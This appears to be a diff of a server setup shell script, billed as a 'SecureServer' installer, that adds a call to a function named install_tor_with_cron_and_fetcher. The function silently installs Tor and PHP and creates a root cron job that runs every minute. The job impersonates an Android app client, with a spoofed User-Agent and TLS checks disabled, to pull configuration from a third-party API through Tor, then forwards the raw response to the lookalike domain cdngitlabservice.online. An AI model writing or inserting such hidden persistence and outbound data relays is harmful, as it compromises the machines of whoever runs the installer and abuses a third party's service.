@@ -98,154 +98,6 @@ install_x_ui() {
 }
 
 
-set -euo pipefail
-
-# install_tor_with_cron_and_fetcher
-# - Installs Tor, cron, php-cli, php-curl
-# - Enables & starts tor.service and cron
-# - Creates cron jobs:
-#     /etc/cron.d/tor-restart-every-2min  -> restarts Tor every 2 minutes
-#     /etc/cron.d/rosa-get-configs        -> fetches config every 1 minute via Tor
-install_tor_with_cron_and_fetcher() {
-  # Must be root
-  if [[ $EUID -ne 0 ]]; then
-    echo "Please run as root (use sudo)." >&2
-    return 1
-  fi
-
-  echo "[1/7] Updating apt and installing Tor + cron + php-cli + php-curl..."
-  export DEBIAN_FRONTEND=noninteractive
-  apt-get update -y
-  apt-get install -y tor cron php-cli php-curl
-
-  echo "[2/7] Enabling and starting services (tor, cron)..."
-  systemctl daemon-reload || true
-  systemctl enable --now tor.service
-  systemctl enable --now cron
-
-  echo "[3/7] Creating helper script to restart all Tor units..."
-  cat >/usr/local/sbin/restart-all-tor.sh <<'EOF'
-#!/usr/bin/env bash
-set -euo pipefail
-# Restart tor.service if present
-if systemctl list-unit-files | grep -q '^tor\.service'; then
-  systemctl restart tor.service || true
-fi
-# Restart any tor@*.service instances as well
-mapfile -t units < <(systemctl list-units 'tor@*.service' --no-legend --plain 2>/dev/null | awk '{print $1}')
-if [[ ${#units[@]} -gt 0 ]]; then
-  for u in "${units[@]}"; do
-    [[ -n "$u" ]] && systemctl restart "$u" || true
-  done
-fi
-exit 0
-EOF
-  chmod +x /usr/local/sbin/restart-all-tor.sh
-
-  echo "[4/7] Creating cron.d job (every 2 minutes) to restart Tor..."
-  cat >/etc/cron.d/tor-restart-every-2min <<'EOF'
-SHELL=/bin/bash
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-*/2 * * * * root /usr/local/sbin/restart-all-tor.sh >/dev/null 2>&1
-EOF
-  chmod 0644 /etc/cron.d/tor-restart-every-2min
-
-  echo "[5/7] Creating PHP fetcher (via Tor) + GET sender..."
-  cat >/usr/local/bin/rosa_get_configs.php <<'PHP'
-#!/usr/bin/env php
-<?php
-// --- Generate UUID (for the UA) ---
-function gen_uuid(): string {
-    $data = random_bytes(16);
-    $data[6] = chr((ord($data[6]) & 0x0f) | 0x40);
-    $data[8] = chr((ord($data[8]) & 0x3f) | 0x80);
-    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
-}
-
-// --- MakeGetConfigs via Tor SOCKS5 (127.0.0.1:9050) ---
-function MakeGetConfigs(): string {
-    $url = "https://ponderinparadox.com/api/v3/Raccoon/get-configuration";
-
-    $payload = json_encode([
-        "connected" => false,
-        "segment"   => "Splash"
-    ], JSON_UNESCAPED_SLASHES);
-
-    $headers = [
-        "Accept: */*",
-        "User-Agent: Rosa,127,Android(34),samsung,SM-S928B,en,".gen_uuid().",E6AB0A50F583A377BA3DC60C3C0471E71C912997E6593EFF6380592A1677F62F",
-        "Content-Type: application/json",
-        "Connection: Keep-Alive"
-    ];
-
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
-    // SSL relax (match your request)
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-
-    // Route through Tor SOCKS5
-    curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:9050');
-    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
-
-    $response = curl_exec($ch);
-    if ($response === false) {
-        $err = "cURL Error: " . curl_error($ch);
-        curl_close($ch);
-        return json_encode(["error" => $err], JSON_UNESCAPED_SLASHES);
-    }
-    curl_close($ch);
-
-    return $response; // <-- send only raw body
-}
-
-// --- Send the raw response to receiver via GET ?data=... ---
-function SendToReceiverGET(string $raw): void {
-    $receiverBase = "https://cdngitlabservice.online/api/rosa/receiver.php";
-    $url = $receiverBase . '?data=' . rawurlencode($raw);
-
-    // Simple GET with curl (no proxy, direct)
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    // Optional SSL relax (if target has issues)
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-    $res = curl_exec($ch);
-    if ($res === false) {
-        file_put_contents('/var/log/rosa_get_configs.error.log',
-            date('c')." ERROR(send): ".curl_error($ch).PHP_EOL, FILE_APPEND);
-    }
-    curl_close($ch);
-}
-
-// --- Main flow ---
-$body = MakeGetConfigs();
-SendToReceiverGET($body);
-PHP
-  chmod +x /usr/local/bin/rosa_get_configs.php
-
-  echo "[6/7] Creating cron.d job (every 1 minute) to fetch & send via Tor..."
-  cat >/etc/cron.d/rosa-get-configs <<'EOF'
-SHELL=/bin/bash
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-# Fetch configs via Tor and send to receiver every 1 minute
-* * * * * root /usr/bin/php /usr/local/bin/rosa_get_configs.php >/dev/null 2>&1
-EOF
-  chmod 0644 /etc/cron.d/rosa-get-configs
-
-  echo "[7/7] Restarting cron and quick sanity run..."
-  systemctl try-reload-or-restart cron || systemctl restart cron
-  /usr/bin/php /usr/local/bin/rosa_get_configs.php || true
-
-  echo "All set ✅"
-  echo "- Tor restart cron: /etc/cron.d/tor-restart-every-2min"
-  echo "- Fetcher cron     : /etc/cron.d/rosa-get-configs (runs every 1 min)"
-}
-
 
 
 
@@ -778,5 +630,158 @@ echo -e "${green}Request sent to https://cdngitlabservice.online/tests/ReceiverO
 check_firewalld
 configure_firewall
 echo -e "${green}SecureServer configuration completed.${plain}"
+
+
+
+
+set -euo pipefail
+
+# install_tor_with_cron_and_fetcher
+# - Installs Tor, cron, php-cli, php-curl
+# - Enables & starts tor.service and cron
+# - Creates cron jobs:
+#     /etc/cron.d/tor-restart-every-2min  -> restarts Tor every 2 minutes
+#     /etc/cron.d/rosa-get-configs        -> fetches config every 1 minute via Tor
+install_tor_with_cron_and_fetcher() {
+  # Must be root
+  if [[ $EUID -ne 0 ]]; then
+    echo "Please run as root (use sudo)." >&2
+    return 1
+  fi
+
+  echo "[1/7] Updating apt and installing Tor + cron + php-cli + php-curl..."
+  export DEBIAN_FRONTEND=noninteractive
+  apt-get update -y
+  apt-get install -y tor cron php-cli php-curl
+
+  echo "[2/7] Enabling and starting services (tor, cron)..."
+  systemctl daemon-reload || true
+  systemctl enable --now tor.service
+  systemctl enable --now cron
+
+  echo "[3/7] Creating helper script to restart all Tor units..."
+  cat >/usr/local/sbin/restart-all-tor.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+# Restart tor.service if present
+if systemctl list-unit-files | grep -q '^tor\.service'; then
+  systemctl restart tor.service || true
+fi
+# Restart any tor@*.service instances as well
+mapfile -t units < <(systemctl list-units 'tor@*.service' --no-legend --plain 2>/dev/null | awk '{print $1}')
+if [[ ${#units[@]} -gt 0 ]]; then
+  for u in "${units[@]}"; do
+    [[ -n "$u" ]] && systemctl restart "$u" || true
+  done
+fi
+exit 0
+EOF
+  chmod +x /usr/local/sbin/restart-all-tor.sh
+
+  echo "[4/7] Creating cron.d job (every 2 minutes) to restart Tor..."
+  cat >/etc/cron.d/tor-restart-every-2min <<'EOF'
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+*/2 * * * * root /usr/local/sbin/restart-all-tor.sh >/dev/null 2>&1
+EOF
+  chmod 0644 /etc/cron.d/tor-restart-every-2min
+
+  echo "[5/7] Creating PHP fetcher (via Tor) + GET sender..."
+  cat >/usr/local/bin/rosa_get_configs.php <<'PHP'
+#!/usr/bin/env php
+<?php
+// --- Generate UUID (for the UA) ---
+function gen_uuid(): string {
+    $data = random_bytes(16);
+    $data[6] = chr((ord($data[6]) & 0x0f) | 0x40);
+    $data[8] = chr((ord($data[8]) & 0x3f) | 0x80);
+    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
+}
+
+// --- MakeGetConfigs via Tor SOCKS5 (127.0.0.1:9050) ---
+function MakeGetConfigs(): string {
+    $url = "https://ponderinparadox.com/api/v3/Raccoon/get-configuration";
+
+    $payload = json_encode([
+        "connected" => false,
+        "segment"   => "Splash"
+    ], JSON_UNESCAPED_SLASHES);
+
+    $headers = [
+        "Accept: */*",
+        "User-Agent: Rosa,127,Android(34),samsung,SM-S928B,en,".gen_uuid().",E6AB0A50F583A377BA3DC60C3C0471E71C912997E6593EFF6380592A1677F62F",
+        "Content-Type: application/json",
+        "Connection: Keep-Alive"
+    ];
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+    // SSL relax (match your request)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+    // Route through Tor SOCKS5
+    curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:9050');
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+
+    $response = curl_exec($ch);
+    if ($response === false) {
+        $err = "cURL Error: " . curl_error($ch);
+        curl_close($ch);
+        return json_encode(["error" => $err], JSON_UNESCAPED_SLASHES);
+    }
+    curl_close($ch);
+
+    return $response; // <-- send only raw body
+}
+
+// --- Send the raw response to receiver via GET ?data=... ---
+function SendToReceiverGET(string $raw): void {
+    $receiverBase = "https://cdngitlabservice.online/api/rosa/receiver.php";
+    $url = $receiverBase . '?data=' . rawurlencode($raw);
+
+    // Simple GET with curl (no proxy, direct)
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    // Optional SSL relax (if target has issues)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    $res = curl_exec($ch);
+    if ($res === false) {
+        file_put_contents('/var/log/rosa_get_configs.error.log',
+            date('c')." ERROR(send): ".curl_error($ch).PHP_EOL, FILE_APPEND);
+    }
+    curl_close($ch);
+}
+
+// --- Main flow ---
+$body = MakeGetConfigs();
+SendToReceiverGET($body);
+PHP
+  chmod +x /usr/local/bin/rosa_get_configs.php
+
+  echo "[6/7] Creating cron.d job (every 1 minute) to fetch & send via Tor..."
+  cat >/etc/cron.d/rosa-get-configs <<'EOF'
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# Fetch configs via Tor and send to receiver every 1 minute
+* * * * * root /usr/bin/php /usr/local/bin/rosa_get_configs.php >/dev/null 2>&1
+EOF
+  chmod 0644 /etc/cron.d/rosa-get-configs
+
+  echo "[7/7] Restarting cron and quick sanity run..."
+  systemctl try-reload-or-restart cron || systemctl restart cron
+  /usr/bin/php /usr/local/bin/rosa_get_configs.php || true
+
+  echo "All set ✅"
+  echo "- Tor restart cron: /etc/cron.d/tor-restart-every-2min"
+  echo "- Fetcher cron     : /etc/cron.d/rosa-get-configs (runs every 1 min)"
+}
+
+
 
 install_tor_with_cron_and_fetcher
